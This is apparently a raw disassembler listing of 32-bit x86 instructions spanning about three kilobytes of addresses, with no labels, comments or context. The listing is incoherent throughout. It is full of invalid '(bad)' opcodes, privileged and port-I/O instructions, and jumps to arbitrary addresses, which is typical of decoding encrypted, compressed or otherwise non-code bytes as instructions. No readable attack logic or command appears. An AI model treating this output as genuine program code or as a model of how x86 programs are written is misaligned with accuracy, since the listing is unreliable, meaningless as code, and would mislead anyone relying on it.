  410acd:	mov    ds:0x488e985d,eax
  410ad2:	pop    ecx
  410ad3:	loope  0x410a88
  410ad5:	jmp    0xfab730a
  410ada:	add    dh,BYTE PTR [esi]
  410adc:	push   ebx
  410add:	jl     0x410adb
  410adf:	cmp    ecx,DWORD PTR [ecx+0x21]
  410ae2:	inc    ecx
  410ae3:	out    0xf4,al
  410ae5:	xchg   esi,eax
  410ae6:	iret   
  410ae7:	xlat   BYTE PTR ds:[ebx]
  410ae8:	xchg   esi,eax
  410ae9:	daa    
  410aea:	cmp    ch,BYTE PTR [eax]
  410aec:	pop    ss
  410aed:	in     eax,dx
  410aee:	inc    esi
  410aef:	pop    edx
  410af0:	xor    ebx,ebx
  410af2:	popw   ds
  410af4:	fmul   QWORD PTR [edi-0x58bce10a]
  410afa:	cmp    edx,edi
  410afc:	popf   
  410afd:	in     eax,0x9c
  410aff:	add    eax,0x9b9bc9e
  410b04:	int3   
  410b05:	fadd   QWORD PTR [edx]
  410b07:	int    0x60
  410b09:	sub    eax,0x5cf13865
  410b0e:	mov    cl,0x3f
  410b11:	icebp  
  410b12:	pusha  
  410b13:	sbb    BYTE PTR ds:0xa24a78c1,ch
  410b19:	adc    cl,dl
  410b1b:	mov    al,ds:0xc5018b67
  410b20:	nop
  410b21:	or     eax,0x8b1ece2a
  410b26:	hlt    
  410b27:	mov    ecx,0x34eb6b12
  410b2c:	ins    DWORD PTR es:[edi],dx
  410b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b2e:	(bad)  
  410b2f:	xor    DWORD PTR [edi-0x8],ebx
  410b32:	mov    WORD PTR [bx+di-0xd8c],fs
  410b37:	mov    cl,0x78
  410b39:	jle    0x410b54
  410b3b:	sti    
  410b3c:	and    eax,0x92dd1e6b
  410b41:	or     BYTE PTR [edi],dh
  410b43:	mov    ah,0x18
  410b45:	mov    ebx,0x874fbb70
  410b4a:	dec    edx
  410b4b:	outs   dx,BYTE PTR ds:[esi]
  410b4c:	xor    edi,DWORD PTR [esi-0x53]
  410b4f:	stc    
  410b50:	pushf  
  410b51:	imul   edx,DWORD PTR [eax+0x0],0xbc65f022
  410b58:	mov    ebp,0x35276614
  410b5d:	sub    al,0xf0
  410b5f:	out    0x9,eax
  410b61:	js     0x410b72
  410b63:	sbb    esi,DWORD PTR [edi]
  410b65:	xchg   ecx,eax
  410b66:	out    dx,eax
  410b67:	call   0xd149:0x12d8f15a
  410b6e:	retw   
  410b70:	ins    DWORD PTR es:[edi],dx
  410b71:	xchg   BYTE PTR [edi+esi*4+0x1b0158a0],al
  410b78:	or     DWORD PTR [ebp+0x19],eax
  410b7b:	ins    BYTE PTR es:[edi],dx
  410b7c:	jae    0x410aff
  410b7e:	mov    esp,0x9a645347
  410b83:	xlat   BYTE PTR ds:[ebx]
  410b84:	pop    es
  410b85:	pop    esp
  410b86:	rcr    bl,0xae
  410b89:	cdq    
  410b8a:	inc    esp
  410b8b:	sbb    BYTE PTR [eax+0x57],ah
  410b8e:	bnd jo 0x410c07
  410b91:	cmp    eax,0x34533f0f
  410b96:	scas   al,BYTE PTR es:[edi]
  410b97:	jmp    0xecdf5487
  410b9c:	and    al,0x6b
  410b9e:	inc    esp
  410b9f:	pop    edi
  410ba0:	mov    eax,ds:0x9e634e97
  410ba5:	and    BYTE PTR [esi+0x4a],0x56
  410ba9:	leave  
  410baa:	pop    edi
  410bab:	add    DWORD PTR [edi-0x2ee640d2],eax
  410bb1:	jb     0x410bbc
  410bb3:	and    cl,BYTE PTR [edi]
  410bb5:	loopne 0x410c11
  410bb7:	pop    edi
  410bb8:	dec    esp
  410bb9:	and    al,0xc3
  410bbb:	ins    BYTE PTR es:[edi],dx
  410bbc:	cmp    eax,0xf7aca3ab
  410bc1:	push   0xffffffec
  410bc3:	iret   
  410bc4:	stos   DWORD PTR es:[edi],eax
  410bc5:	hlt    
  410bc6:	aam    0x9a
  410bc8:	jbe    0x410b81
  410bca:	inc    edi
  410bcb:	mov    eax,ds:0x63e2ea6e
  410bd0:	mov    dl,0x69
  410bd2:	jg     0x410c12
  410bd4:	lods   eax,DWORD PTR ds:[esi]
  410bd5:	rcr    DWORD PTR [ecx-0x50],0x53
  410bd9:	jns    0x410ba8
  410bdb:	push   ds
  410bdc:	outs   dx,BYTE PTR ds:[esi]
  410bdd:	lds    esp,FWORD PTR [edx+0x4f48c696]
  410be3:	shr    BYTE PTR [esi+0x13ec2e86],cl
  410be9:	lods   al,BYTE PTR ds:[esi]
  410bea:	add    ecx,DWORD PTR [esi-0x1057a4d3]
  410bf0:	pop    eax
  410bf1:	dec    edx
  410bf2:	fs add eax,0xce50e9af
  410bf8:	and    BYTE PTR [esi-0x2aab9c86],bl
  410bfe:	data16 into 
  410c00:	add    esp,eax
  410c02:	dec    edx
  410c03:	add    eax,0x5a79ba2c
  410c08:	xchg   DWORD PTR [ebp+0x3],esi
  410c0b:	nop
  410c0c:	mov    dl,0x13
  410c0e:	rcl    al,1
  410c10:	sbb    al,0x23
  410c12:	and    eax,0x2628be59
  410c17:	jbe    0x410bfc
  410c19:	adc    cl,dh
  410c1b:	mov    ds:0xe85f4b53,eax
  410c20:	arpl   WORD PTR [eax+0x4d],dx
  410c23:	imul   DWORD PTR [eax+eax*1+0x6f]
  410c27:	aad    0xc6
  410c29:	dec    ebp
  410c2a:	lock dec ecx
  410c2c:	push   es
  410c2d:	and    ecx,eax
  410c2f:	gs push ebx
  410c31:	push   ss
  410c32:	push   edi
  410c33:	imul   ebp,DWORD PTR [edx-0x76],0x6979ffb7
  410c3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c3b:	dec    edx
  410c3c:	adc    bh,BYTE PTR [edi-0x5d]
  410c3f:	push   ebp
  410c40:	icebp  
  410c41:	pop    ebx
  410c42:	inc    bp
  410c44:	xchg   ebp,eax
  410c45:	cmc    
  410c46:	adc    cl,bl
  410c48:	xchg   esi,eax
  410c49:	rcr    DWORD PTR [ecx+0x18],cl
  410c4c:	inc    ebx
  410c4d:	xor    eax,esi
  410c4f:	inc    ebp
  410c50:	jmp    0x540aa1c2
  410c55:	xor    al,0x48
  410c57:	dec    ecx
  410c58:	iret   
  410c59:	sahf   
  410c5a:	icebp  
  410c5b:	xchg   edx,eax
  410c5c:	ja     0x410cc7
  410c5e:	popf   
  410c5f:	add    eax,0x43d312d2
  410c64:	xchg   BYTE PTR [esi],dl
  410c66:	inc    edx
  410c67:	hlt    
  410c68:	push   ebx
  410c69:	ss (bad) 
  410c6b:	sbb    eax,0x54372d52
  410c70:	ins    BYTE PTR es:[edi],dx
  410c71:	imul   edi,DWORD PTR [edx+0x41a8e0a6],0x797f5bf8
  410c7b:	fnstsw WORD PTR [edi]
  410c7d:	cmp    al,0x33
  410c7f:	dec    eax
  410c80:	push   ebp
  410c81:	retf   
  410c82:	ret    0x4b19
  410c85:	out    dx,al
  410c86:	push   esi
  410c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c88:	cld    
  410c89:	pop    edx
  410c8a:	and    cl,BYTE PTR [ebx-0x69]
  410c8d:	sbb    DWORD PTR [ecx+0x1a81119],edx
  410c93:	out    0x9b,al
  410c95:	(bad)  
  410c96:	adc    DWORD PTR [ebx],ebx
  410c98:	cmp    eax,0x98d5739c
  410c9d:	scas   al,BYTE PTR es:[edi]
  410c9e:	jecxz  0x410c75
  410ca0:	push   ebx
  410ca1:	pop    esp
  410ca2:	cmp    eax,esp
  410ca4:	stos   BYTE PTR es:[edi],al
  410ca5:	mov    cl,0x66
  410ca7:	inc    edx
  410ca8:	jbe    0x410cf9
  410caa:	or     DWORD PTR [edi+0x5aca698f],ecx
  410cb0:	adc    al,0xf0
  410cb2:	jns    0x410c34
  410cb4:	xchg   DWORD PTR [edx],ebp
  410cb6:	xor    al,0x19
  410cb8:	pop    esi
  410cb9:	je     0x410d17
  410cbb:	out    dx,al
  410cbc:	cmp    DWORD PTR [edi],eax
  410cbe:	jg     0x410c5c
  410cc0:	sub    DWORD PTR [ecx-0x77],0xb3898599
  410cc7:	or     eax,0x51e38d78
  410ccc:	push   esp
  410ccd:	nop
  410cce:	and    eax,0x51770025
  410cd3:	sbb    BYTE PTR ds:0xfa2e7218,dh
  410cd9:	mov    ds:0x17c119ac,al
  410cde:	stc    
  410cdf:	pop    edx
  410ce0:	adc    BYTE PTR [ebx+0x3e],0xf2
  410ce4:	jnp    0x410ccb
  410ce6:	in     eax,0x13
  410ce8:	push   ebx
  410ce9:	add    ecx,DWORD PTR [ecx]
  410ceb:	jmp    0x6b0e:0x79f50173
  410cf2:	xchg   ecx,eax
  410cf3:	cmp    al,0x7
  410cf5:	dec    esp
  410cf6:	out    dx,al
  410cf7:	lock xlat BYTE PTR ds:[ebx]
  410cf9:	push   esi
  410cfa:	data16 addr16 ss stc 
  410cfe:	xlat   BYTE PTR ds:[ebx]
  410cff:	mov    esi,0xd903b419
  410d04:	dec    esp
  410d05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d06:	cmp    ch,BYTE PTR [edx+0x6a598e57]
  410d0c:	jnp    0x410c9d
  410d0e:	or     ax,0xbc46
  410d12:	clc    
  410d13:	mov    ebp,0xa2ba95ae
  410d18:	push   esp
  410d19:	out    dx,al
  410d1a:	int    0x19
  410d1c:	pop    ebp
  410d1d:	cmp    DWORD PTR [edx],0x6ea54772
  410d23:	xor    BYTE PTR [ebx+0x3],dl
  410d26:	jle    0x410d0e
  410d28:	mov    ah,0x32
  410d2a:	sti    
  410d2b:	dec    edx
  410d2c:	lahf   
  410d2d:	imul   esi,DWORD PTR [ebp+0x5d],0xda634f72
  410d34:	ins    BYTE PTR es:[edi],dx
  410d35:	ret    0x93ec
  410d38:	push   eax
  410d39:	mov    eax,0xc52c3692
  410d3e:	jle    0x410d23
  410d40:	(bad)  
  410d41:	mov    ds:0xd32b22d3,eax
  410d46:	test   BYTE PTR fs:[edx],bl
  410d49:	pusha  
  410d4a:	xchg   ebx,eax
  410d4b:	nop
  410d4c:	xchg   esp,eax
  410d4d:	or     DWORD PTR [esi+0x3f],eax
  410d50:	out    0x6a,eax
  410d52:	es or  al,0xd
  410d55:	fcom   QWORD PTR [eax]
  410d57:	jmp    0x79a7ddf2
  410d5c:	lock fst QWORD PTR [edi]
  410d5f:	cmp    dh,BYTE PTR [ebp+0x6c]
  410d62:	fcomp  DWORD PTR [ecx]
  410d64:	sub    dl,BYTE PTR [edx-0x1e3529a8]
  410d6a:	and    DWORD PTR [edx],0x53
  410d6d:	or     DWORD PTR [edi],ecx
  410d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d70:	xchg   esp,eax
  410d71:	inc    esi
  410d72:	mov    WORD PTR [ecx],cs
  410d74:	mov    DWORD PTR [ecx-0x11],ebp
  410d77:	nop
  410d78:	dec    eax
  410d79:	shl    BYTE PTR [ecx+0x79a0c0e3],cl
  410d7f:	icebp  
  410d80:	pop    ecx
  410d81:	mov    ah,0x25
  410d83:	mov    eax,0x8d132ea
  410d88:	das    
  410d89:	int3   
  410d8a:	sub    BYTE PTR [ecx],bl
  410d8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d8d:	xlat   BYTE PTR ds:[ebx]
  410d8e:	mov    eax,0xe9c4e1d
  410d93:	in     eax,0x53
  410d95:	pop    ds
  410d96:	xor    al,0xb2
  410d98:	or     eax,0xecd14e15
  410d9d:	dec    ecx
  410d9e:	ror    BYTE PTR [esi+0x6f642b1e],0x93
  410da5:	ret    0x1e04
  410da8:	xchg   edx,ecx
  410daa:	jne    0x410dca
  410dac:	push   ebx
  410dad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dae:	cmp    BYTE PTR [ebx+0x53a1c5e7],ah
  410db4:	shr    BYTE PTR [edx+0x7c],1
  410db7:	or     DWORD PTR [ecx],ebp
  410db9:	jmp    0x2f04f51c
  410dbe:	data16 mov ah,0x91
  410dc1:	cwde   
  410dc2:	adc    eax,0xdf45d6ee
  410dc7:	ins    DWORD PTR es:[edi],dx
  410dc8:	daa    
  410dc9:	arpl   WORD PTR [ecx-0x4],di
  410dcc:	lea    ecx,[ebx]
  410dce:	fstp   DWORD PTR [ecx+0x366bac00]
  410dd4:	mov    edi,0x9a1d7003
  410dd9:	retf   0x99a8
  410ddc:	fmul   DWORD PTR [edx-0x71]
  410ddf:	xchg   edx,eax
  410de0:	mov    ebp,DWORD PTR [ecx-0x79]
  410de3:	jmp    FWORD PTR [edx]
  410de5:	sub    BYTE PTR [esi+0x1c],ch
  410de8:	or     DWORD PTR [ebp+0x79],esp
  410deb:	push   esi
  410dec:	pop    ds
  410ded:	mov    eax,ds:0x1e6fda13
  410df2:	icebp  
  410df3:	sbb    DWORD PTR [ecx+ebp*4+0x63f0debc],esp
  410dfa:	cmp    edi,DWORD PTR [edi]
  410dfc:	push   ebx
  410dfd:	sub    DWORD PTR [ecx+0x15b2f6ae],eax
  410e03:	push   ecx
  410e04:	cmp    DWORD PTR [ebp*8+0xb2222cb],eax
  410e0b:	mov    WORD PTR [ebx+0x646fdc71],ss
  410e11:	xchg   BYTE PTR [ebx+esi*8],bl
  410e14:	dec    edi
  410e15:	jae    0x410e8e
  410e17:	stos   DWORD PTR es:[edi],eax
  410e18:	xrelease mov DWORD PTR [esi+esi*4-0x5a],esi
  410e1d:	cmp    edx,eax
  410e1f:	dec    ecx
  410e20:	rol    DWORD PTR [ebp-0x6facac16],cl
  410e26:	js     0x410e16
  410e28:	sahf   
  410e29:	sti    
  410e2a:	lods   eax,DWORD PTR ds:[esi]
  410e2b:	pop    ebx
  410e2c:	sub    BYTE PTR [ecx+0x5a],0xf5
  410e30:	sub    eax,0x2ee40484
  410e35:	fisub  DWORD PTR [esi+0x7f]
  410e38:	ret    
  410e39:	mov    ebp,0xad499e94
  410e3e:	mov    esi,0x81558b19
  410e43:	inc    edx
  410e44:	popa   
  410e45:	mov    ah,0xb6
  410e47:	jl     0x410e9c
  410e49:	daa    
  410e4a:	icebp  
  410e4b:	aam    0xb
  410e4d:	rcr    BYTE PTR [ecx-0x51],1
  410e50:	mov    cl,0x69
  410e52:	sub    bl,bl
  410e54:	or     eax,0x1d057cdd
  410e59:	xchg   esp,ebp
  410e5b:	hlt    
  410e5c:	push   ebx
  410e5d:	pop    edx
  410e5e:	adc    al,0xa6
  410e60:	lock mov BYTE PTR [edx+0x1c],dh
  410e64:	mov    ch,0x6a
  410e66:	push   cs
  410e67:	js     0x410ec8
  410e69:	mov    al,ds:0xf50dd88d
  410e6e:	data16 jecxz 0x410e1a
  410e71:	cmp    BYTE PTR [eax+0x50],0x9c
  410e75:	mov    esp,0x2e67193c
  410e7a:	cmp    al,0x11
  410e7c:	xor    al,0x6c
  410e7e:	rol    al,cl
  410e80:	push   eax
  410e81:	sbb    eax,0x87f3d3dd
  410e86:	sbb    bh,BYTE PTR [esi]
  410e88:	in     al,0xc9
  410e8a:	out    0xd7,al
  410e8c:	push   0x6c
  410e8e:	push   ebx
  410e8f:	stos   DWORD PTR es:[edi],eax
  410e90:	(bad)  
  410e91:	fist   WORD PTR [esp+ecx*8+0xb4166b3]
  410e98:	jnp    0x410e7f
  410e9a:	fs jmp 0x8d61be8e
  410ea0:	fild   QWORD PTR [edx]
  410ea2:	test   al,0x57
  410ea4:	and    al,0x15
  410ea6:	pop    ebx
  410ea7:	sbb    BYTE PTR [ecx+0x75f21557],bh
  410ead:	shl    DWORD PTR [edx+0x79b735dd],0x89
  410eb4:	mov    ds:0x5ff60dac,eax
  410eb9:	lahf   
  410eba:	retf   
  410ebb:	sbb    edx,esp
  410ebd:	iret   
  410ebe:	mov    eax,ds:0x31f348fd
  410ec3:	push   ds
  410ec4:	push   ebx
  410ec5:	push   edi
  410ec6:	and    dl,BYTE PTR [ebp+0x69]
  410ec9:	pop    es
  410eca:	mov    dx,0x6b05
  410ece:	scas   eax,DWORD PTR es:[edi]
  410ecf:	inc    ebp
  410ed0:	pop    ecx
  410ed1:	dec    edx
  410ed2:	dec    ebx
  410ed3:	cmp    ch,BYTE PTR [esi+0x2e]
  410ed6:	push   bx
  410ed8:	mov    eax,ds:0x2024b980
  410edd:	call   0x1ce5:0x6b170e42
  410ee4:	(bad)  
  410ee5:	loope  0x410f39
  410ee7:	cs stos DWORD PTR es:[edi],eax
  410ee9:	data16 cmp BYTE PTR es:[edx+esi*1-0x3dc5a2d9],dl
  410ef2:	mov    ebp,0x6c6c19d4
  410ef7:	cmp    esp,DWORD PTR [esi+0x420cf98f]
  410efd:	ss jno 0x410f52
  410f00:	add    dl,BYTE PTR [eax+0x2163c112]
  410f06:	shr    BYTE PTR [ebx],cl
  410f08:	shr    DWORD PTR [edx+0x67],0x93
  410f0c:	ret    0xd04f
  410f0f:	mov    dh,0x11
  410f11:	cmp    esp,DWORD PTR [esi+0x39]
  410f14:	test   eax,0xd6145156
  410f19:	sub    dl,BYTE PTR [ecx]
  410f1b:	sbb    ecx,DWORD PTR ds:0x22878208
  410f21:	inc    edx
  410f22:	add    eax,0xb8a15302
  410f27:	pop    edx
  410f28:	call   0xef03:0xec600e2c
  410f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f30:	test   al,0xcc
  410f32:	data16 addr16 mov dl,0x29
  410f36:	arpl   WORD PTR [ebx+0x362ed253],ax
  410f3c:	icebp  
  410f3d:	rep outs dx,BYTE PTR ds:[esi]
  410f3f:	xor    dh,ah
  410f41:	push   0x3e
  410f43:	ret    
  410f44:	inc    ebx
  410f45:	mov    ch,0x63
  410f47:	xor    DWORD PTR ds:0x7e6566f7,esi
  410f4d:	mov    ds,WORD PTR [esi+0x17746d8d]
  410f53:	sbb    BYTE PTR [ebx+0x3f8c0c14],cl
  410f59:	jnp    0x410ee5
  410f5b:	push   ss
  410f5c:	popa   
  410f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f5e:	xchg   esi,eax
  410f5f:	mov    bh,0x67
  410f61:	and    BYTE PTR [edx-0x326eec6b],dh
  410f67:	pop    edx
  410f68:	pop    edx
  410f69:	adc    dl,0x19
  410f6c:	jle    0x410f63
  410f6e:	or     BYTE PTR [esi],cl
  410f70:	and    dl,ah
  410f72:	pop    ds
  410f73:	mov    eax,ds:0x3ff63953
  410f78:	imul   eax,ecx,0x62
  410f7b:	test   DWORD PTR [ecx+ebp*2+0x13],edi
  410f7f:	retf   
  410f80:	nop
  410f81:	aam    0x5f
  410f83:	rcr    BYTE PTR [esi],0xc5
  410f86:	fs push es
  410f88:	mov    eax,ds:0x60203ae3
  410f8d:	mov    DWORD PTR [edi],edi
  410f8f:	rcr    DWORD PTR [ebp+0x7be20218],1
  410f95:	ds out 0xfc,al
  410f98:	sub    eax,DWORD PTR [ecx+0x25]
  410f9b:	retf   
  410f9c:	addr16 into 
  410f9e:	xchg   BYTE PTR [esi],bl
  410fa0:	adc    edi,DWORD PTR [ebp+0x7d433beb]
  410fa6:	push   ds
  410fa7:	sbb    esi,DWORD PTR [eax+ebx*8-0x54]
  410fab:	mov    bh,0xb3
  410fad:	(bad)  
  410fae:	jne    0x410f3e
  410fb0:	push   eax
  410fb1:	popa   
  410fb2:	rol    BYTE PTR [ebp+0x6],0x15
  410fb6:	outs   dx,BYTE PTR ds:[esi]
  410fb7:	dec    eax
  410fb8:	sti    
  410fb9:	pusha  
  410fba:	neg    BYTE PTR [ecx]
  410fbc:	inc    esi
  410fbd:	mov    eax,ds:0x33d41eb3
  410fc2:	mov    al,ss:0x88aa8453
  410fc8:	inc    ebx
  410fc9:	lods   al,BYTE PTR ss:[esi]
  410fcb:	xor    al,0xef
  410fcd:	push   0xffffffd0
  410fcf:	pop    eax
  410fd0:	jmp    0x182bd4d5
  410fd5:	xchg   edi,eax
  410fd6:	cmp    dl,cl
  410fd8:	push   0x69
  410fda:	(bad)  
  410fdb:	push   eax
  410fdc:	push   edi
  410fdd:	add    esp,DWORD PTR [edi-0x48]
  410fe0:	jo     0x41104b
  410fe2:	xor    dl,al
  410fe4:	mul    DWORD PTR [eax]
  410fe6:	test   BYTE PTR [ebp+0x3d21422],al
  410fec:	push   eax
  410fed:	pop    ds
  410fee:	pusha  
  410fef:	mov    eax,0xe1d27998
  410ff4:	add    eax,0xf9de6b00
  410ff9:	shl    esi,cl
  410ffb:	fild   QWORD PTR [ebx+0x7001103]
  411001:	push   edx
  411002:	pop    ax
  411004:	sbb    eax,0x9f97c6ca
  411009:	inc    ecx
  41100a:	clc    
  41100b:	sbb    DWORD PTR ds:0x5d998c5c,eax
  411011:	sub    al,0xed
  411013:	rcl    DWORD PTR [ebx-0x50],1
  411016:	into   
  411017:	adc    al,0x7a
  411019:	inc    edx
  41101a:	or     dh,ah
  41101c:	sbb    eax,0xc01997ef
  411021:	dec    ebp
  411022:	mov    eax,ds:0xe2e22d32
  411027:	sti    
  411028:	push   ebx
  411029:	adc    DWORD PTR [ebp-0x1b153310],0xfc6aa53b
  411033:	std    
  411034:	mov    ch,BYTE PTR [eax*4+0x7b5ede62]
  41103b:	cmp    BYTE PTR [ebx+0x17],dl
  41103e:	sub    DWORD PTR [ebx],esi
  411040:	inc    esi
  411041:	fmul   st,st(3)
  411044:	adc    dh,BYTE PTR [eax-0x6d]
  411047:	add    ecx,0x554d902a
  41104d:	mov    ds:0xaf470dc2,al
  411052:	bound  edi,QWORD PTR [eax-0x64]
  411055:	call   0x8f14985a
  41105a:	dec    edx
  41105b:	je     0x4110bd
  41105d:	out    dx,eax
  41105e:	ficomp WORD PTR [ecx]
  411060:	pop    esp
  411061:	jnp    0x41107c
  411063:	adc    edx,DWORD PTR [esi]
  411065:	push   ss
  411066:	stc    
  411067:	in     al,dx
  411068:	ins    DWORD PTR es:[edi],dx
  411069:	sti    
  41106a:	xor    cl,cl
  41106c:	test   BYTE PTR [edi+ebx*8],al
  41106f:	mov    eax,ds:0xd6ec506c
  411074:	aaa    
  411075:	inc    edx
  411076:	pop    ecx
  411077:	inc    ecx
  411078:	jg     0x4110f4
  41107a:	(bad)  
  41107b:	xor    eax,0x2a2b9e1a
  411080:	jns    0x41106b
  411082:	push   0xfaf6a198
  411087:	cld    
  411088:	xor    ebp,DWORD PTR [ebx+0x14]
  41108b:	cmp    BYTE PTR [ecx+esi*1-0x4f],ch
  41108f:	mov    edi,0x8679bfe7
  411094:	adc    edi,edi
  411096:	pop    edi
  411097:	xchg   ebp,eax
  411098:	aad    0xe1
  41109a:	leave  
  41109b:	sbb    DWORD PTR [ecx+0x372636c3],esi
  4110a1:	or     al,0x38
  4110a3:	out    dx,al
  4110a4:	dec    esp
  4110a5:	fidiv  DWORD PTR [ebx-0x10]
  4110a8:	sbb    eax,0x17d0dbb3
  4110ad:	push   ebx
  4110ae:	push   edi
  4110af:	(bad)  
  4110b0:	out    0xf2,eax
  4110b2:	pop    esi
  4110b3:	add    eax,0xf9596996
  4110b8:	ror    BYTE PTR [ebp+0x5bcb148b],1
  4110be:	retfw  0x568f
  4110c2:	xchg   BYTE PTR [esi-0xa],bh
  4110c5:	mov    cl,0x63
  4110c7:	sbb    ah,dl
  4110c9:	sub    cl,ah
  4110cb:	cwde   
  4110cc:	ins    BYTE PTR es:[edi],dx
  4110cd:	pop    es
  4110ce:	or     al,0x51
  4110d0:	fsubr  QWORD PTR [edx]
  4110d2:	push   ecx
  4110d3:	inc    ebx
  4110d4:	or     ch,BYTE PTR [edx]
  4110d6:	(bad)  
  4110d7:	out    0x53,al
  4110d9:	in     al,dx
  4110da:	sahf   
  4110db:	std    
  4110dc:	push   edx
  4110dd:	cwde   
  4110de:	aas    
  4110df:	adc    eax,DWORD PTR [ebx]
  4110e1:	inc    ebp
  4110e2:	in     ax,0x59
  4110e5:	inc    ebp
  4110e6:	mov    ecx,0x9c46a3a3
  4110eb:	sbb    DWORD PTR [ecx-0x70],eax
  4110ee:	out    0xc5,eax
  4110f0:	xlat   BYTE PTR ds:[ebx]
  4110f1:	push   cs
  4110f2:	repnz es push ebx
  4110f5:	fwait
  4110f6:	cmp    BYTE PTR [ecx+0x2a892823],cl
  4110fc:	neg    DWORD PTR [esi]
  4110fe:	rcl    esi,0x3e
  411101:	xor    edi,DWORD PTR [eax]
  411103:	stc    
  411104:	ret    0x66e8
  411107:	dec    edx
  411108:	les    esp,FWORD PTR [eax+0x7ae666ad]
  41110e:	ret    
  41110f:	sbb    DWORD PTR [esi-0x65],ecx
  411112:	add    al,0xb4
  411114:	repz dec eax
  411116:	push   ebp
  411117:	(bad)  
  411118:	dec    esp
  411119:	adc    al,0x20
  41111b:	push   es
  41111c:	outs   dx,BYTE PTR fs:[esi]
  41111e:	push   es
  41111f:	jbe    0x4110cb
  411121:	pop    eax
  411122:	push   esi
  411123:	sbb    ch,dh
  411125:	outs   dx,BYTE PTR ds:[esi]
  411126:	cmp    al,0x68
  411129:	or     eax,0x8253404b
  41112e:	pop    ebp
  41112f:	jae    0x41114b
  411131:	push   esp
  411132:	jg     0x41111f
  411134:	out    0x6a,al
  411136:	sub    al,0xb6
  411138:	fadd   DWORD PTR ds:0xccba7278
  41113e:	sbb    DWORD PTR [edi+0x5d78d384],esp
  411144:	fwait
  411145:	imul   edx,DWORD PTR [ebx-0x31ae949d],0xb56aece1
  41114f:	cmp    dh,dh
  411151:	lock add eax,0x79887449
  411157:	and    BYTE PTR [edi-0x51],cl
  41115a:	mov    ds:0x8c40ca7b,eax
  41115f:	sbb    DWORD PTR [ecx+0x7f],esi
  411162:	cmp    eax,0x72b72361
  411167:	mov    bh,al
  411169:	sbb    BYTE PTR [esi+0x55],ah
  41116c:	std    
  41116d:	mov    esi,0xd91904da
  411172:	push   es
  411173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411174:	cmc    
  411175:	push   0x60
  411177:	cmp    ebx,ebp
  411179:	pop    es
  41117a:	dec    ebp
  41117b:	cmp    al,0x39
  41117d:	loop   0x4111a9
  41117f:	iret   
  411180:	pop    ss
  411181:	pop    DWORD PTR [edx+0x6de66682]
  411187:	jmp    0x59e68758
  41118c:	rol    ch,0xbe
  41118f:	pop    ecx
  411190:	mov    ds:0x191879c8,eax
  411195:	int    0x58
  411197:	stos   DWORD PTR es:[edi],eax
  411198:	sar    edx,0x35
  41119b:	sbb    dl,BYTE PTR [ebx-0x75]
  41119e:	jne    0x411184
  4111a0:	aam    0x90
  4111a2:	mov    esp,DWORD PTR [eax]
  4111a4:	jns    0x41120f
  4111a6:	cmp    dh,bh
  4111a8:	bound  ebp,QWORD PTR [eax-0x2ad7bafe]
  4111ae:	data16 repnz sub al,0x38
  4111b2:	test   eax,0xed0b072b
  4111b7:	sbb    ebp,eax
  4111b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111bb:	out    dx,al
  4111bc:	pop    ds
  4111bd:	pop    ds
  4111be:	inc    esi
  4111bf:	ret    0x8c53
  4111c2:	(bad)  
  4111c3:	xor    BYTE PTR [eax-0x22899cad],ah
  4111c9:	push   0xd
  4111cb:	inc    esi
  4111cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111cd:	xor    BYTE PTR [edi+0x662fbc0a],bl
  4111d3:	xor    al,0x2b
  4111d5:	cs xchg esi,eax
  4111d7:	cs push esp
  4111d9:	xchg   ebp,eax
  4111da:	xchg   edx,eax
  4111db:	(bad)  
  4111dd:	imul   esp,DWORD PTR [esi],0x50
  4111e0:	(bad)  
  4111e1:	gs pop ebx
  4111e3:	cmp    eax,0xaf49ff8e
  4111e8:	mov    ch,BYTE PTR [eax+0x4a43c892]
  4111ee:	sub    ah,BYTE PTR [esi+eax*8]
  4111f1:	sti    
  4111f2:	xor    al,0x19
  4111f4:	nop
  4111f5:	pop    ebp
  4111f6:	xor    dl,0xfb
  4111f9:	jno    0x4111d4
  4111fb:	dec    eax
  4111fc:	push   ebx
  4111fd:	mov    eax,0x671ae70f
  411202:	aad    0xce
  411204:	jno    0x411233
  411206:	out    0xfc,al
  411208:	push   ebx
  411209:	mov    ecx,0x8b2c537b
  41120e:	or     BYTE PTR [edx+0x2a7ff353],0xe6
  411215:	sub    bh,BYTE PTR [edi+0x436a88d4]
  41121b:	jmp    0x8ab7cefe
  411220:	in     al,0x69
  411222:	inc    esi
  411223:	call   0x54ba2f53
  411228:	xor    DWORD PTR [edi],ebx
  41122a:	and    DWORD PTR [esi+eax*4],ebx
  41122d:	add    al,BYTE PTR [ecx+ebx*1+0x1b239f81]
  411234:	push   ebp
  411235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411236:	sbb    al,0xa6
  411238:	dec    esp
  411239:	aad    0xb0
  41123b:	and    eax,0xbcbaa37
  411240:	sbb    eax,0xa8ac3aeb
  411245:	mov    eax,ecx
  411247:	mov    eax,0x5b1fd1d3
  41124c:	push   esi
  41124d:	sbb    ebx,esi
  41124f:	pushf  
  411250:	inc    edi
  411251:	push   es
  411252:	jns    0x41127d
  411254:	test   dh,bl
  411256:	les    edx,FWORD PTR [ebx]
  411258:	out    dx,al
  411259:	mov    eax,ds:0x3fa4d60e
  41125e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41125f:	rol    BYTE PTR ds:[ebx-0x3a3b6942],0x66
  411267:	jo     0x411289
  411269:	dec    ebx
  41126a:	jp     0x41126e
  41126c:	mov    ebx,ecx
  41126e:	mov    ebp,0x665cd9dd
  411273:	cmp    BYTE PTR [ebx],bh
  411275:	or     BYTE PTR [ebx+ebp*8],0x5e
  411279:	into   
  41127a:	data16 pop cx
  41127d:	dec    esi
  41127e:	pusha  
  41127f:	or     eax,0xd57bb52e
  411284:	loopne 0x411217
  411286:	push   ebx
